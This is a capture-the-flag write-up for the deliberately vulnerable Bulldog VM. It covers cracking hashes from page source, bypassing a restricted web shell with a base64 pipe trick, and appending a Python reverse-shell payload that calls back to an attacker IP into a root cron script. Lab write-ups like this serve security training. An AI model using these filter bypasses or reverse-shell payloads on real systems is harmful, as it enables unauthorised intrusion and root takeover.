<b>VM name:</b> 
Bulldog

<b>Objective:</b>
Get root!

(bulldog VM image)

After loading this VM up in VirtualBox, it gives us the box's IP, so no real need to do an arp-scan to find out our target address.
So, first things first, let's run an Nmap scan to see what ports and services are available!
(***Please note that I worked on this VM and write-up from two different locations, so the DHCP IP address will appear different in certain screenshots. There are also times I switch back and forth between my Kali box and my Ubuntu box)

(nmap scan results) 

It seems they are running SSH on port 23 (it's not running as telnet), and there is some web activity on 80 and 8080. Exploring the web stuff first, I confirmed that both 80 and 8080 are just mirrors of each other and couldn't find any differences. We are first greeted with this landing page. 

(bulldog landing page)

The initial page doesn't offer much other than info that they've been breached. The source code didn't have anything interesting either--nor did the link to the Notice page. So, perhaps something is hiding on this domain somewhere. First thing I looked at: robots.txt. But it was a troll.

(robots.txt image)

Time to load up Sparta and see if it can detect anything interesting to explore.

(sparta image)

Hmm, this looks good. A dev page! 

(dev page)

Nice, a system overhaul to make it more secure. But is it really? There's a bunch of info on employees here which could be useful. Clicking on the web-shell, it seems we need authentication to proceed. What to do, what to do...

(web-shell denied)

Let's check the source code for the /dev page. Sure enough we find something interesting!

(dev page source)

Those are SHA-1 hashes, so let's run em in a decoder to see if we can get any plaintext passwords. 

(sha decoder results)

Nice! We have two results, which gives us a pair of credentials for something. But for what? I immediately tried the credentials on the SSH port, but no luck there, so there must be something else. Is there an admin page hiding? Yep!

(admin page)

Logging in with Nick's credentials, we can then access the web-shell as we are authenticated.

(nick logged in)
(web-shell page)

Neat. As the text on the /dev page mentioned, this is a shell interface, but it looks like we are limited only to a couple of commands. 
Semi-colon doesn't work to escape, and we get a message busting us! However, there are more ways than just that to escape. Can we trick it by passing all of our commands through base64? Let's test it with the following:

echo 'whoami'|base64|base64 -d|sh

(base64 test)

Sweet, it works. Now we can fully interact with the shell and pass whatever commands we like. While we don't need to pass it through base64, let's see if there is anything interesting in the /etc/passwd file. 

(etc/passwd)

Not too much here, but let's explore some other directories and files that you can usually bet on having something good. Next stop is /etc/cron.d!

(cron.d)

Running cat on each of these files, runAV contained something suspicious and worth checking out--a hidden directory with an application.

(AVApplication)

Awesome--so this means that this application is run AS ROOT every minute. Let's cat the contents.

(AVApp contents)

You dun messed up Alan! Now we have a vector for getting a reverse shell and potentially even more (priviledge escalation!). Since this is already set as a python script, we can echo in python code to this file to get a reverse shell up.


Pentest Monkey's Reverse Shell Cheatsheet is a good resource for reverse shell information, and we can utilize the following:

'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("OUR IP ADDRESS",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Let's setup a listening port with netcat on our machine, and then add the code to the application using our web-shell.
Remember, however, we can't use any semi-colons since they will be detected, so instead, we need to split this up line by line. A little tedious, but it will be worth it if it works.

(listening port)
(python code add)

echo 'import socket,subprocess,os' >> /.hiddenAVDirectory/AVApplication.py|base64|base64 -d|sh
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)' >> /.hiddenAVDirectory/AVApplication.py|base64|base64 -d|sh
echo 's.connect(("192.168.1.113",1234))' >> /.hiddenAVDirectory/AVApplication.py|base64|base64 -d|sh
echo 'os.dup2(s.fileno(),0)' >> /.hiddenAVDirectory/AVApplication.py|base64|base64 -d|sh
echo 'os.dup2(s.fileno(),1)' >> /.hiddenAVDirectory/AVApplication.py|base64|base64 -d|sh
echo 'os.dup2(s.fileno(),2)' >> /.hiddenAVDirectory/AVApplication.py|base64|base64 -d|sh
echo 'p=subprocess.call(["/bin/sh","-i"])' >> /.hiddenAVDirectory/AVApplication.py|base64|base64 -d|sh

Now we just wait a minute annnnnnnnnd...

Amazing! We are in AND we are also root since it executed under root! 

(connected)

Now, I know that we are alread root and our primary objective is done... but the box is challenging us with another way to get root, and I'm not one to turn down a challenge! Time to explore all the files and see if there is anything in here that is interesting.

Checking out the home folder we find the Bulldogadmin user we knew existed from the /etc/passwd file. 

(bulldogadmin files)

Seriously, what is with this company and hidden directories and prefacing them as 'hidden'--kind of a dead giveaway, no? 
At least name it 'garbage'! :P

In the hidden directory we find an app (customPermissionApp) and a note...

(note from ashley)

Thanks Ashley! But unfortunately we can't run it. Perhaps, however, there is something useful we can find by running strings on the executable?

(strings on app)

'SUPERultimatePASSWORDyouCANTget'

Winner, winner, chicken dinner! That looks like it could definitely be a password when put together (and it says it's a password!), unless we are getting super trolled. While I did not attempt to gain access through different means, I am certain that if the box can be accessed with a different user, we can use this password to gain root priviledges via 'sudo su'.

Seems like Bulldog Industries still has a ways to go before they are safe from breaches!
